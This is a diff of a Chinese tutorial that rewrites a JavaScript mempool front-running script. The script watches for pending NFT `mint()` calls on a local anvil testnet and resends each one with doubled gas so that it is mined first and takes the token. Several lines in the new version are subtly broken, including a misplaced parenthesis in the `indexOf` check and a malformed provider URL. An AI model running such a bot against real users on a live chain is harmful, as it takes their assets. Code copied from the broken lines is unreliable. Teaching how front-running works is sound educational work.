@@ -46,8 +46,8 @@ contract FreeMint is ERC721 {
 
     // 铸造函数
     function mint() external {
-        _mint(msg.sender, totalSupply); // mint
         totalSupply++;
+        _mint(msg.sender, totalSupply); // mint
     }
 }
 ```
@@ -65,86 +65,106 @@ anvil
 下面，我们详解一下抢跑脚本`frontrun.js`，这个脚本会监听链上的`mint()`交易，并发送一个gas更高的相同交易，进行抢跑。
 
 1. 创建连接到foundry本地测试网的`provider`对象，用于监听和发送交易。foundry本地测试网默认url：`"http://127.0.0.1:8545"`。
+
     ```js
+    //1.连接到foundry本地网络
+
     import { ethers } from "ethers";
-
-    // 1. 创建provider
-    var url = "http://127.0.0.1:8545";
-    const provider = new ethers.WebSocketProvider(url);
+    const provider = new ethers.providers.WebSocketProvider('<http://127.0.0.1:8545>')
     let network = provider.getNetwork()
-    network.then(res => console.log(`[${(new Date).toLocaleTimeString()}] 连接到 chain ID ${res.chainId}`));
+    network.then(res => console.log(`[${(new Date).toLocaleTimeString()}]链接到网络${res.chainId}`))
     ```
-
-2. 创建一个包含我们感兴趣的`mint()`函数的`interface`对象，用于解码交易。如果你不了解它，可以阅读[WTF Ethers极简教程第20讲：解码交易](https://github.com/WTFAcademy/WTFEthers/blob/main/20_DecodeTx/readme.md)。
-    ```js
-    // 2. 创建interface对象，用于解码交易详情。
-    const iface = new ethers.Interface([
-        "function mint() external",
-    ])
-    ```
-
-3. 创建测试钱包，用于发送抢跑交易，私钥是foundry测试网提供的，里面有10000 ETH测试币。
+2. 创建合约实例，用于查看mint结果，确认是否抢跑成功。
 
     ```js
-    // 3. 创建钱包，用于发送抢跑交易
-    const privateKey = '0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a'
+    //2.构建contract实例
+    const contractABI = [
+        "function mint() public",
+        "function ownerOf(uint256) public view returns (address) ",
+        "function totalSupply() view returns (uint256)"
+    ]
+
+    const contractAddress = '0xC76A71C4492c11bbaDC841342C4Cb470b5d12193'//合约地址
+    const contractFM = new ethers.Contract(contractAddress, contractABI, provider)
+    ```
+3. 创建一个包含我们感兴趣的`mint()`函数的`interface`对象，用于在监听过程中使用。如果你不了解它，可以阅读[WTF Ethers极简教程第20讲：解码交易](https://github.com/WTFAcademy/WTFEthers/blob/main/20_DecodeTx/readme.md)。
+
+    ```js
+    //3.创建Interface对象，用于检索mint函数。
+    const iface = new ethers.utils.Interface(contractABI)
+    function getSignature(fn) {
+        return iface.getSighash(fn)
+    }
+    ```
+
+4. 创建测试钱包，用于发送抢跑交易，私钥是foundry测试网提供的，里面有10000 ETH测试币。
+
+    ```js
+    //4. 创建测试钱包，用于发送抢跑交易，私钥是foundry测试网提供
+    const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
     const wallet = new ethers.Wallet(privateKey, provider)
     ```
 
-4. 我们利用`provider.on`方法监听mempool中的未决交易，当交易出现时，我们会利用交易哈希`txHash`来读取交易详情`tx`，并筛选出调用了`mint()`函数且发送方不是自己钱包地址的交易（如果不筛选，会自己抢跑自己的交易，陷入死循环）。然后，再打印筛选出的交易哈希。
+5. 我们先看一下正常的mint结果是怎样的。我们利用`provider.on`方法监听mempool中的未决交易，当交易出现时，我们会利用交易哈希`txHash`来读取交易详情`tx`，并筛选出调用了`mint()`函数的交易，查看交易结果，获取mint的nft编码及对应的owner，比对交易发起地址与owner是否一致。确认，mint按预期执行。
 
     ```js
-    provider.on("pending", async (txHash) => {
-        if (txHash) {
-            // 获取tx详情
-            let tx = await provider.getTransaction(txHash);
-            if (tx) {
-                // filter pendingTx.data
-                if (tx.data.indexOf(iface.getFunction("mint").selector) !== -1 && tx.from != wallet.address ) {
-                    // 打印txHash
-                    console.log(`\n[${(new Date).toLocaleTimeString()}] 监听Pending交易: ${txHash} \r`);
+    //5. 构建正常mint函数，检验mint结果，显示正常。
+    const normaltx = async () => {
+    provider.on('pending', async (txHash) => {
+        provider.getTransaction(txHash).then(
+            async (tx) => {
+                if (tx.data.indexOf(getSignature("mint") !== -1)) {
+                    console.log(`[${(new Date).toLocaleTimeString()}]监听到交易:${txHash}`)
+                    console.log(`铸造发起的地址是:${tx.from}`)//打印交易发起地址
+                    await tx.wait()
+                    const tokenId = await contractFM.totalSupply()
+                    console.log(`mint的NFT编号:${tokenId}`)
+                    console.log(`编号${tokenId}NFT的持有者是${await contractFM.ownerOf(tokenId)}`)//打印nft持有者地址
+                    console.log(`铸造发起的地址是不是对应NFT的持有者:${tx.from === await contractFM.ownerOf(tokenId)}`)//比较二者是否一致
+                }
+            }
+        )
+    })
+    }
     ```
+
     ![](./img/23-2.png)
 
-5. 打印筛选出的未决交易详情
+6. 进行抢跑mint。我们依旧利用`provider.on`方法监听mempool中的未决交易，当有调用了mint()函数的交易出现且发送方不是自己钱包地址的交易（如果不筛选，会自己抢跑自己的交易，陷入死循环）时，构建抢跑交易，发送交易进行抢跑。等待交易结束后，查看抢跑结果。预期将要被mint的nft并未被原交易发起地址mint，而是由抢跑地址mint。同时查看区块内数据，抢跑交易在原始交易前被打包进区块，抢跑成功！
 
     ```js
-    // 打印原始交易
-    console.log("raw transaction")
-    console.log(tx);
-    ```   
-    ![](./img/23-3.png)
-
-6. 打印解码后的交易详情，可以看到该交易调用的是`mint()`函数。 
-
-    ```js
-    // 打印交易解码后结果
-    let parsedTx = iface.parseTransaction(tx)
-    console.log("pending交易详情解码：")
-    console.log(parsedTx);
-    ```
-    ![](./img/23-4.png)
-
-7. 构建抢跑交易`txFrontrun`，原交易的目标地址`to`，发送以太坊数额`value`和发送数据`data`保持不变，然后将`gas`拉高：`maxPriorityFeePerGas` 和 `maxFeePerGas` 改为原先的 1.2 倍，`gasLimit`最高设为原先的 2 倍。然后通过 `sendTransaction()` 将交易发送到链上，完成抢跑！
-
-    ```js
-    // 构建抢跑tx
-    const txFrontrun = {
-        to: tx.to,
-        value: tx.value,
-        maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 2n,
-        maxFeePerGas: tx.maxFeePerGas * 2n,
-        gasLimit: tx.gasLimit * 2,
-        data: tx.data
+    const frontRun = async () => {
+    provider.on('pending', async (txHash) => {
+        const tx = await provider.getTransaction(txHash)
+        if (tx.data.indexOf(getSignature("mint")) !== -1 && tx.from !== wallet.address) {
+            console.log(`[${(new Date).toLocaleTimeString()}]监听到交易:${txHash}\n准备抢先交易`)
+            const frontRunTx = {
+                to: tx.to,
+                value: tx.value,
+                maxPriorityFeePerGas: tx.maxPriorityFeePerGas.mul(2),
+                maxFeePerGas: tx.maxFeePerGas.mul(2),
+                gasLimit: tx.gasLimit.mul(2),
+                data: tx.data
+            }
+            const aimTokenId = (await contractFM.totalSupply()).add(1)
+            console.log(`即将被mint的NFT编号是:${aimTokenId}`)//打印应该被mint的nft编号
+            const sentFR = await wallet.sendTransaction(frontRunTx)
+            console.log(`正在frontrun交易`)
+            const receipt = await sentFR.wait()
+            console.log(`frontrun 交易成功,交易hash是:${receipt.transactionHash}`)
+            console.log(`铸造发起的地址是:${tx.from}`)
+            console.log(`编号${aimTokenId}NFT的持有者是${await contractFM.ownerOf(aimTokenId)}`)//刚刚mint的nft持有者并不是tx.from
+            console.log(`编号${aimTokenId.add(1)}的NFT的持有者是:${await contractFM.ownerOf(aimTokenId.add(1))}`)//tx.from被wallet.address抢跑，mint了下一个nft
+            console.log(`铸造发起的地址是不是对应NFT的持有者:${tx.from === await contractFM.ownerOf(aimTokenId)}`)//比对地址，tx.from被抢跑
+            //检验区块内数据结果
+            const block = await provider.getBlock(tx.blockNumber)
+            console.log(`区块内交易数据明细:${block.transactions}`)//在区块内，后发交易排在先发交易前，抢跑成功。
+        }
+    })
     }
-    // 发送抢跑交易
-    var txResponse = await wallet.sendTransaction(txFrontrun)
-    console.log(`正在frontrun交易`)
-    await txResponse.wait()
-    console.log(`frontrun 交易成功`)   
     ```
 
-    ![](./img/23-5.png)
+    ![](./img/23-3.png)
 
 ## 总结
 
